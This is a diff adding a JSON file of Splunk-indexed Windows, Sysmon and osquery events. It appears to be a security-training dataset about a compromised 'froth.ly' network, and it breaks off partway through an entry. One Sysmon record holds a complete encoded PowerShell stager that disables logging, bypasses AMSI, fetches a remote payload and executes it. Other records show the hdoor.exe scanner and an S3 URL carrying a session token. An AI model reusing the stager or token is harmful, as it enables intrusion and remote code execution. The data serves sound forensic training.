@@ -1,0 +1,314 @@
+[
+  {
+    "bucket": "db_1534762138_1534758300_302",
+    "row": 381375,
+    "event": {
+      "_time": "1534761790",
+      "source": "source::WinEventLog:Security",
+      "host": "host::FYODOR-L",
+      "sourcetype": "sourcetype::WinEventLog:Security",
+      "_raw": "08/19/2018 22:43:10 PM\nLogName=Security\nSourceName=Microsoft Windows security auditing.\nEventCode=4688\nEventType=0\nType=Information\nComputerName=FYODOR-L.froth.ly\nTaskCategory=Process Creation\nOpCode=Info\nRecordNumber=278561\nKeywords=Audit Success\nMessage=A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tAzureAD\\FyodorMalteskesko\n\tAccount Name:\t\tFyodorMalteskesko\n\tAccount Domain:\t\tAzureAD\n\tLogon ID:\t\t0x1091C98\n\nTarget Subject:\n\tSecurity ID:\t\tNULL SID\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nProcess Information:\n\tNew Process ID:\t\t0x2814\n\tNew Process Name:\tC:\\Windows\\Temp\\hdoor.exe\n\tToken Elevation Type:\t%%1937\n\tMandatory Label:\t\tMandatory Label\\High Mandatory Level\n\tCreator Process ID:\t0x18d8\n\tCreator Process Name:\tC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tProcess Command Line:\t\"C:\\windows\\temp\\hdoor.exe\" -hbs 192.168.9.1-192.168.9.50 /b /m /n\n\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\n\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\n\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",
+      "_meta": "_indextime::1534761791 punct::\"//_::_\\\\r=\\\\r=___.\\\\r=\\\\r=\\\\r=\\\\r=-..\\\\r=_\\\\r=\\\\r=\\\\r=_\\\\r=_____.\\\\r\\\\r\\\\r\\\\r_:\\\\r\""
+    }
+  },
+  {
+    "bucket": "db_1534762138_1534758300_302",
+    "row": 381377,
+    "event": {
+      "_time": "1534761790",
+      "source": "source::WinEventLog:Microsoft-Windows-Sysmon/Operational",
+      "host": "host::FYODOR-L",
+      "sourcetype": "sourcetype::XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
+      "_raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2018-08-20T10:43:10.220757500Z'/><EventRecordID>33288</EventRecordID><Correlation/><Execution ProcessID='10440' ThreadID='2904'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>FYODOR-L.froth.ly</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='UtcTime'>2018-08-20 10:43:10.215</Data><Data Name='ProcessGuid'>{EBF7A186-CCB6-5B58-0000-00109D240102}</Data><Data Name='ProcessId'>10260</Data><Data Name='Image'>C:\\Windows\\Temp\\hdoor.exe</Data><Data Name='FileVersion'>?</Data><Data Name='Description'>?</Data><Data Name='Product'>?</Data><Data Name='Company'>?</Data><Data Name='CommandLine'>\"C:\\windows\\temp\\hdoor.exe\" -hbs 192.168.9.1-192.168.9.50 /b /m /n</Data><Data Name='CurrentDirectory'>C:\\windows\\temp\\</Data><Data Name='User'>AzureAD\\FyodorMalteskesko</Data><Data Name='LogonGuid'>{EBF7A186-8503-5B57-0000-0020981C0901}</Data><Data Name='LogonId'>0x1091c98</Data><Data Name='TerminalSessionId'>3</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=586EF56F4D8963DD546163AC31C865D7,SHA256=99925199059EE049F7AEDA8904C2F5BDFBA86671FD7A5989BD60B72F26EF737C</Data><Data Name='ParentProcessGuid'>{EBF7A186-C442-5B58-0000-00109914D901}</Data><Data Name='ParentProcessId'>6360</Data><Data Name='ParentImage'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='ParentCommandLine'>\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoP -NonI -W Hidden -enc SQBmACgAJABQAFMAVgBFAHIAUwBJAG8AbgBUAGEAYgBsAEUALgBQAFMAVgBlAFIAUwBJAG8AbgAuAE0AQQBKAE8AUgAgAC0AZwBFACAAMwApAHsAJABHAFAARgA9AFsAcgBFAGYAXQAuAEEAUwBTAGUAbQBCAGwAWQAuAEcARQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAEkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAEEATAB1AEUAKAAkAG4AdQBsAGwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAYQBsAD0AWwBDAG8AbABsAGUAYwB0AGkAbwBOAHMALgBHAGUATgBlAFIASQBDAC4ARABpAEMAdABJAG8AbgBhAFIAeQBbAFMAVAByAGkAbgBnACwAUwB5AFMAdABFAE0ALgBPAEIAagBlAGMAdABdAF0AOgA6AE4AZQBXACgAKQA7ACQAdgBhAEwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBhAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAEEAbAB9AEUAbABzAGUAewBbAFMAQwBSAEkAcABUAEIATABvAEMASwBdAC4AIgBHAGUAVABGAGkAZQBgAGwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAEwAdQBFACgAJABOAFUAbABsACwAKABOAEUAVwAtAE8AQgBKAEUAYwBUACAAQwBPAGwATABFAEMAVABJAE8ATgBTAC4ARwBlAG4ARQByAGkAQwAuAEgAQQBTAEgAUwBFAFQAWwBzAFQAUgBpAG4ARwBdACkAKQB9ACQAUgBlAEYAPQBbAFIARQBGAF0ALgBBAFMAcwBFAE0AQgBMAFkALgBHAGUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAJwApADsAJABSAEUAZgAuAEcAZQBUAEYAaQBFAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBhAEwAdQBFACgAJABuAFUATABMACwAJAB0AHIAVQBFACkAOwB9ADsAWwBTAFkAcwBUAEUATQAuAE4AZQBUAC4AUwBFAFIAVgBJAGMARQBQAG8ASQBOAFQATQBhAE4AYQBHAEUAUgBdADoAOgBFAFgAUABlAEMAdAAxADAAMABDAE8AbgB0AGkAbgBVAEUAPQAwADsAJAB3AEMAPQBOAGUAdwAtAE8AQgBKAGUAQwB0ACAAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFcAZQBiAEMATABpAEUATgBUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAkAFcAQwAuAEgARQBBAGQAZQBSAHMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAEgARQBhAGQARQBSAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAUgBvAFgAeQA9AFsAUwB5AFMAdABlAG0ALgBOAEUAVAAuAFcAZQBCAFIAZQBxAFUARQBTAHQAXQA6ADoARABlAGYAYQBVAGwAVABXAEUAYgBQAHIAbwBYAHkAOwAkAFcAQwAuAFAAcgBvAHgAWQAuAEMAUgBlAGQAZQBOAFQAaQBBAEwAcwAgAD0AIABbAFMAWQBzAFQAZQBtAC4ATgBFAHQALgBDAHIAZQBEAGUATgBUAGkAQQBMAEMAYQBjAEgAZQBdADoAOgBEAGUAZgBhAFUAbABUAE4ARQB0AFcAbwByAGsAQwByAEUAZABlAG4AdABpAGEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAVABlAE0ALgBUAGUAeABUAC4ARQBuAEMATwBkAGkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQBUAEIAWQBUAEUAUwAoACcAMQBBAEIAPABZAGsANgBaADQAIwArAHYAVgB1ACUAbwA1AH0AOAAmAE0ALQA5AFUATAB+AGwAfAA+ADAAZwBQACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAEkAbgBnAF0AOgA6AFUAbgBJAGMATwBEAEUALgBHAEUAdABTAFQAcgBpAG4ARwAoAFsAQwBvAG4AdgBFAFIAdABdADoAOgBGAHIAbwBNAEIAQQBzAGUANgA0AFMAdAByAGkATgBHACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEIAegBBAEQAbwBBAEwAdwBBAHYAQQBEAFEAQQBOAFEAQQB1AEEARABjAEEATgB3AEEAdQBBAEQAVQBBAE0AdwBBAHUAQQBEAEUAQQBOAHcAQQAyAEEARABvAEEATgBBAEEAMABBAEQATQBBACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJABXAEMALgBIAEUAYQBEAEUAcgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAFAAdABoAEEAVgBnAHMAPQBoAEIAMgBIADAARwBUAEkAcAB3AHgAQwBlAEwAaABHAGUALwBmAEwAawBmAEIAcABDAGQASQA9ACIAKQA7ACQAZABhAFQAQQA9ACQAdwBDAC4ARABPAFcAbgBsAG8AQQBkAEQAQQB0AEEAKAAkAHMARQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABBAFQAQQBbADAALgAuADMAXQA7ACQARABhAFQAYQA9ACQAZABhAFQAQQBbADQALgAuACQARABhAHQAYQAuAGwARQBOAEcAVABIAF0AOwAtAGoAbwBpAE4AWwBDAGgAQQByAFsAXQBdACgAJgAgACQAUgAgACQARABhAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA</Data></EventData></Event>",
+      "_meta": "_indextime::1534761791 punct::<_='://../////'><><_='--'_='{----}'/><></><></><><"
+    }
+  },
+  {
+    "bucket": "db_1534762138_1534758300_302",
+    "row": 384025,
+    "event": {
+      "_time": "1534761813",
+      "source": "source::process",
+      "host": "host::FYODOR-L",
+      "sourcetype": "sourcetype::WinHostMon",
+      "_raw": "Type=Process\nName=\"hdoor.exe\"\nProcessId=10260\nCommandLine=\"\"C:\\windows\\temp\\hdoor.exe\" -hbs 192.168.9.1-192.168.9.50 /b /m /n\"\nStartTime=\"20180820104310.215687+000\"\nHost=\"FYODOR-L\"\nPath=\"C:\\windows\\temp\\hdoor.exe\"",
+      "_meta": "_indextime::1534761813 punct::\"=\\\\r=\\\".\\\"\\\\r=\\\\r=\\\"\\\":\\\\\\\\\\\\.\\\"_-_...-..._/_/_/\\\"\\\\r=\\\".+\\\"\\\\r=\\\"-\\\"\\\\r=\\\":\""
+    }
+  },
+  {
+    "bucket": "db_1534776480_1534769280_306",
+    "row": 423540,
+    "event": {
+      "_time": "1534774027",
+      "source": "source::WinEventLog:Microsoft-Windows-Sysmon/Operational",
+      "host": "host::BSTOLL-L",
+      "sourcetype": "sourcetype::XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
+      "_raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2018-08-20T14:07:07.152057000Z'/><EventRecordID>37242</EventRecordID><Correlation/><Execution ProcessID='6804' ThreadID='2596'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>BSTOLL-L.froth.ly</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='UtcTime'>2018-08-20 14:07:07.146</Data><Data Name='ProcessGuid'>{EBF7A186-218B-5B59-0000-00105CA57800}</Data><Data Name='ProcessId'>1288</Data><Data Name='Image'>C:\\Windows\\System32\\browser_broker.exe</Data><Data Name='FileVersion'>11.00.17134.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Browser_Broker</Data><Data Name='Product'>Microsoft\u00ae Windows\u00ae Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='CommandLine'>C:\\Windows\\system32\\browser_broker.exe -IOAVHost 2781761e-28e0-4109-99fe-b9d127c57afe|C:\\Users\\BudStoll\\Downloads\\frothly_html_memcached.tar.gz|https://s3.us-west-1.amazonaws.com/frothlywebcode/frothly_html_memcached.tar.gz?response-content-disposition=attachment&amp;X-Amz-Security-Token=AgoGb3JpZ2luEMX%%2F%%2F%%2F%%2F%%2F%%2F%%2F%%2F%%2F%%2FwEaCXVzLWVhc3QtMSKAAmoNLg%%2B1dLHydp451EOVkO5N4xvVD5oBzbD1yxOWCM8zF4OcPL9cwQ4jkv04g%%2BO%%2BREKD2bOsWpi8UZPohl6%%2FY2B%%2F7VnwyZ8yhGBZHesCGih%%2Bu6OzLYHJ5Y0RGOOe8NUia2HcBfZN479VzSUV0ofQuBQQhdLqma%%2BsjRDmdNT6juAMYtDspXlbi6NOByngZSijhSRuS7TBTjNJiDg53xzfZQ3Cyvpj9feBKSAY0GKfuZXKh4NWUtXD9HqTSLbBMJZ3rxkW792qSuFUyardvAdJZxIAXOSUxLqstbPSCXaTQnI1lRA0uP82E8dwzSIf11WZgFmapi2CyMPDD8gkFjKks08q%%2BwMImv%%2F%%2F%%2F%%2F%%2F%%2F%%2F%%2F%%2F%%2FARAAGgw2MjI2NzY3MjEyNzgiDNtvTivSENdU9LH3TirPA1x2D7cb8wBVllxrC54%%2Fc410TBA3WIN2Ig3zI98W92nmJOZ%%2B26lISJbbGpEyu1BYxiVxSd1f0KsxokupnlNjA4weDrrkZJ8oNBbOJC%%2FXBXqPokEg4YUtE%%2BwKiCkq4rfUSSd5W6LpWCCl8PXmDELAkAMVMulPQj6JTrJnomKvNt8PFcnLh72S8HVYD4uY79YozzL2rssdFpe3rXy7x9zTi4ugs3MFLAkc2XzgV7sX1zzBYfZTSPVGWG92L8nRhgRFk%%2BHx6CWTFO8v6tNdeJe0KFQzdvFY6HzDQogTFEAq90nhVry%%2FS%%2BEve37%%2FXxAy%%2FE4iOysE2go4XLeurkqf2v3%%2BWGm1WE78B1jsgV4a2waWAJDLkHsZaz8KvJjtkt0eJISPB4oDJ4Ph7kNKSYGZmsf3gWEyw4QMxU2imLdJ2VYp%%2ByOyBULmsoOqtcdruXiEoMxWm7puH%%2FohJ%%2FSRarH32KkjLzlTMnOLpker4toBZkpY1IaIoxJaJU3bQanHaeZywc65A9ZdGG0BfROfQew1F%%2FPOPcPyQaFANl2wSGuF199nucZJgMB1RlYwgmY%%2BFqd2X43Z%%2F1xh%%2FB7ICNFLUJxHkI0FtjmAAjYk4YMervfEkijrUXkw7MLk2gU%%3D&amp;X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Date=20180726T011903Z&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Expires=300&amp;X-Amz-Credential=ASIAZB6TMXZ7MZVT22N3%%2F20180726%%2Fus-west-1%%2Fs3%%2Faws4_request&amp;X-Amz-Signature=7901bf899b4c9bd5dde897e4fc68ebcf0644e5b782e519db2c817d39e5b22331</Data><Data Name='CurrentDirectory'>C:\\Windows\\system32\\</Data><Data Name='User'>AzureAD\\BudStoll</Data><Data Name='LogonGuid'>{EBF7A186-1A26-5B59-0000-00200CC50400}</Data><Data Name='LogonId'>0x4c50c</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=635FC8FDD817C127A0750C6F917BEF12,SHA256=25C7FA3C0BF1171D5D0D008658D29002390E223D4AB83970C171979B568CA10D</Data><Data Name='ParentProcessGuid'>{EBF7A186-1A3A-5B59-0000-00106AEB0900}</Data><Data Name='ParentProcessId'>8056</Data><Data Name='ParentImage'>C:\\Windows\\System32\\browser_broker.exe</Data><Data Name='ParentCommandLine'>C:\\Windows\\system32\\browser_broker.exe -Embedding</Data></EventData></Event>",
+      "_meta": "_indextime::1534774028 punct::<_='://../////'><><_='--'_='{----}'/><></><></><><"
+    }
+  },
+  {
+    "bucket": "db_1534776480_1534769280_306",
+    "row": 423571,
+    "event": {
+      "_time": "1534774027",
+      "source": "source::WinEventLog:Security",
+      "host": "host::BSTOLL-L",
+      "sourcetype": "sourcetype::WinEventLog:Security",
+      "_raw": "08/20/2018 14:07:07 PM\nLogName=Security\nSourceName=Microsoft Windows security auditing.\nEventCode=4688\nEventType=0\nType=Information\nComputerName=BSTOLL-L.froth.ly\nTaskCategory=Process Creation\nOpCode=Info\nRecordNumber=1009094\nKeywords=Audit Success\nMessage=A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tAzureAD\\BudStoll\n\tAccount Name:\t\tBudStoll\n\tAccount Domain:\t\tAzureAD\n\tLogon ID:\t\t0x4C50C\n\nTarget Subject:\n\tSecurity ID:\t\tNULL SID\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nProcess Information:\n\tNew Process ID:\t\t0x508\n\tNew Process Name:\tC:\\Windows\\System32\\browser_broker.exe\n\tToken Elevation Type:\t%%1938\n\tMandatory Label:\t\tMandatory Label\\Medium Mandatory Level\n\tCreator Process ID:\t0x1f78\n\tCreator Process Name:\tC:\\Windows\\System32\\browser_broker.exe\n\tProcess Command Line:\tC:\\Windows\\system32\\browser_broker.exe -IOAVHost 2781761e-28e0-4109-99fe-b9d127c57afe|C:\\Users\\BudStoll\\Downloads\\frothly_html_memcached.tar.gz|https://s3.us-west-1.amazonaws.com/frothlywebcode/frothly_html_memcached.tar.gz?response-content-disposition=attachment&X-Amz-Security-Token=AgoGb3JpZ2luEMX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSKAAmoNLg%2B1dLHydp451EOVkO5N4xvVD5oBzbD1yxOWCM8zF4OcPL9cwQ4jkv04g%2BO%2BREKD2bOsWpi8UZPohl6%2FY2B%2F7VnwyZ8yhGBZHesCGih%2Bu6OzLYHJ5Y0RGOOe8NUia2HcBfZN479VzSUV0ofQuBQQhdLqma%2BsjRDmdNT6juAMYtDspXlbi6NOByngZSijhSRuS7TBTjNJiDg53xzfZQ3Cyvpj9feBKSAY0GKfuZXKh4NWUtXD9HqTSLbBMJZ3rxkW792qSuFUyardvAdJZxIAXOSUxLqstbPSCXaTQnI1lRA0uP82E8dwzSIf11WZgFmapi2CyMPDD8gkFjKks08q%2BwMImv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2MjI2NzY3MjEyNzgiDNtvTivSENdU9LH3TirPA1x2D7cb8wBVllxrC54%2Fc410TBA3WIN2Ig3zI98W92nmJOZ%2B26lISJbbGpEyu1BYxiVxSd1f0KsxokupnlNjA4weDrrkZJ8oNBbOJC%2FXBXqPokEg4YUtE%2BwKiCkq4rfUSSd5W6LpWCCl8PXmDELAkAMVMulPQj6JTrJnomKvNt8PFcnLh72S8HVYD4uY79YozzL2rssdFpe3rXy7x9zTi4ugs3MFLAkc2XzgV7sX1zzBYfZTSPVGWG92L8nRhgRFk%2BHx6CWTFO8v6tNdeJe0KFQzdvFY6HzDQogTFEAq90nhVry%2FS%2BEve37%2FXxAy%2FE4iOysE2go4XLeurkqf2v3%2BWGm1WE78B1jsgV4a2waWAJDLkHsZaz8KvJjtkt0eJISPB4oDJ4Ph7kNKSYGZmsf3gWEyw4QMxU2imLdJ2VYp%2ByOyBULmsoOqtcdruXiEoMxWm7puH%2FohJ%2FSRarH32KkjLzlTMnOLpker4toBZkpY1IaIoxJaJU3bQanHaeZywc65A9ZdGG0BfROfQew1F%2FPOPcPyQaFANl2wSGuF199nucZJgMB1RlYwgmY%2BFqd2X43Z%2F1xh%2FB7ICNFLUJxHkI0FtjmAAjYk4YMervfEkijrUXkw7MLk2gU%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20180726T011903Z&X-Amz-SignedHeaders=host&X-Amz-Expires=300&X-Amz-Credential=ASIAZB6TMXZ7MZVT22N3%2F20180726%2Fus-west-1%2Fs3%2Faws4_request&X-Amz-Signature=7901bf899b4c9bd5dde897e4fc68ebcf0644e5b782e519db2c817d39e5b22331\n\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\n\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\n\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",
+      "_meta": "_indextime::1534774028 punct::\"//_::_\\\\r=\\\\r=___.\\\\r=\\\\r=\\\\r=\\\\r=-..\\\\r=_\\\\r=\\\\r=\\\\r=_\\\\r=_____.\\\\r\\\\r\\\\r\\\\r_:\\\\r\""
+    }
+  },
+  {
+    "bucket": "db_1534776480_1534769280_306",
+    "row": 465272,
+    "event": {
+      "_time": "1534774519",
+      "source": "source::/var/log/osquery/osqueryd.results.log",
+      "host": "host::mars.i-08e52f8b5a034012d",
+      "sourcetype": "sourcetype::osquery:results",
+      "_raw": "{\"name\":\"pack_process-monitoring_proc_events\",\"hostIdentifier\":\"mars.i-08e52f8b5a034012d\",\"calendarTime\":\"Mon Aug 20 14:15:19 2018 UTC\",\"unixTime\":1534774519,\"epoch\":0,\"counter\":0,\"decorations\":{\"host_uuid\":\"EC2F3B71-548C-909E-81C3-B1994405F807\",\"username\":\"LOGIN\"},\"columns\":{\"atime\":\"1531910021\",\"auid\":\"500\",\"btime\":\"0\",\"cmdline\":\"\\\"python\\\" \\\"/home/ec2-user/tools/s3-upload.py\\\" \\\"--bucket\\\" \\\"frothlywebcode\\\" \\\"--file\\\" \\\"frothly_web_memcaced.tar.gz\\\" \\\"--folder\\\" E28098E28099 \\\"--target\\\" \\\"frothly_html_memcached.tar.gz\\\"\",\"ctime\":\"1531909958\",\"cwd\":\"\",\"egid\":\"500\",\"euid\":\"500\",\"gid\":\"500\",\"mode\":\"0100755\",\"mtime\":\"1527492002\",\"owner_gid\":\"0\",\"owner_uid\":\"0\",\"parent\":\"\",\"path\":\"/usr/bin/python2.7\",\"pid\":\"32193\",\"status\":\"\",\"time\":\"1534774461\",\"uid\":\"500\",\"uptime\":\"155384\"},\"action\":\"added\"}",
+      "_meta": "_indextime::1534774519 timestartpos::110 timeendpos::126 date_second::19 date_hour::14 date_minute::15 date_year::2018 date_month::august date_mday::20 date_wday::monday date_zone::local punct::\"{\\\"\\\":\\\"-\\\",\\\"\\\":\\\".-\\\",\\\"\\\":\\\"___::__\\\",\\\"\\\":,\\\"\\\":,\\\"\\\":,\\\"\\\":{\\\"\\\":\\\"-\""
+    }
+  },
+  {
+    "bucket": "db_1534776480_1534769280_306",
+    "row": 465304,
+    "event": {
+      "_time": "1534774519",
+      "source": "source::/var/log/osquery/osqueryd.results.log",
+      "host": "host::mars.i-08e52f8b5a034012d",
+      "sourcetype": "sourcetype::osquery:results",
+      "_raw": "{\"name\":\"pack_process-monitoring_proc_events\",\"hostIdentifier\":\"mars.i-08e52f8b5a034012d\",\"calendarTime\":\"Mon Aug 20 14:15:19 2018 UTC\",\"unixTime\":1534774519,\"epoch\":0,\"counter\":0,\"decorations\":{\"host_uuid\":\"EC2F3B71-548C-909E-81C3-B1994405F807\",\"username\":\"LOGIN\"},\"columns\":{\"atime\":\"1531910021\",\"auid\":\"500\",\"btime\":\"0\",\"cmdline\":\"\\\"python\\\" \\\"/home/ec2-user/tools/s3-upload.py\\\" \\\"--bucket\\\" \\\"frothlywebcode\\\" \\\"--file\\\" \\\"frothly_web_memcaced.tar.gz\\\" \\\"--folder\\\" E28098E28099 \\\"--target\\\" \\\"frothly_html_memcached.tar.gz\\\"\",\"ctime\":\"1531909958\",\"cwd\":\"\",\"egid\":\"500\",\"euid\":\"500\",\"gid\":\"500\",\"mode\":\"0100755\",\"mtime\":\"1527492002\",\"owner_gid\":\"0\",\"owner_uid\":\"0\",\"parent\":\"\",\"path\":\"/usr/bin/python2.7\",\"pid\":\"32245\",\"status\":\"\",\"time\":\"1534774493\",\"uid\":\"500\",\"uptime\":\"155416\"},\"action\":\"added\"}",
+      "_meta": "_indextime::1534774519 timestartpos::110 timeendpos::126 date_second::19 date_hour::14 date_minute::15 date_year::2018 date_month::august date_mday::20 date_wday::monday date_zone::local punct::\"{\\\"\\\":\\\"-\\\",\\\"\\\":\\\".-\\\",\\\"\\\":\\\"___::__\\\",\\\"\\\":,\\\"\\\":,\\\"\\\":,\\\"\\\":{\\\"\\\":\\\"-\""
+    }
+  },
+  {
+    "bucket": "db_1534776480_1534769280_306",
+    "row": 465460,
+    "event": {
+      "_time": "1534774519",
+      "source": "source::/var/log/osquery/osqueryd.results.log",
